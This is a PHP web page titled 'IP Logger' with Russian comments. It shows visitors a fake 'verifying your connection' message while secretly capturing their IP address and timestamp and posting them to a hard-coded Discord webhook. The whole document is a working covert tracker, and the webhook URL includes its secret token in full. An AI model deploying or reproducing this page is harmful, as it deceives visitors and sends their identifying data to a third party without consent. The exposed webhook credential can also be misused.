<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to our website</h1>
        <p>Please wait while we verify your connection...</p>
    </div>

    <?php
    // Получаем IP-адрес посетителя
    function getIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }

    $ip = getIP();
    $timestamp = date("Y-m-d H:i:s");

    // Данные для отправки в Discord
    $data = [
        'content' => "New visit detected!\nIP: $ip\nTime: $timestamp",
        'username' => "IP Logger"
    ];

    // Настройки Webhook
    $webhook_url = 'https://discord.com/api/webhooks/1338244151417901086/NB_mQmzK15E3xIcHD5kMZMS5Dye_FdhPTgmqbL8mx0ESpB10qmrxfJWFSP0bLnk2E1rX';

    // Отправка запроса через cURL
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
    ?>
</body>
</html>